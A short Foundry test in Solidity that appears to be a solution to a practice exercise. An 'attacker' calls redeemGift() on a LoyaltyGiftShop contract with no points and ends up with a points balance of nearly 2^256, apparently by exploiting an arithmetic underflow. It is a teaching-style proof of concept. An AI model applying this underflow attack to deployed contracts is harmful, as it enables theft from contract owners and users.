

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";           
import "../src/07_LoyaltyGiftShop.sol";


contract AttackGiftShop is Test {
    address attacker;
    LoyaltyGiftShop shop;

    function setUp() public{
        attacker = makeAddr('attacker');
        shop = new LoyaltyGiftShop();
        vm.deal(address(shop), 100 ether);

    }

    function testit () public {
        vm.prank(attacker);
        shop.redeemGift();
        uint256 final_points = shop.points(attacker);
        assertEq (final_points, type(uint256).max - 99);
    }

}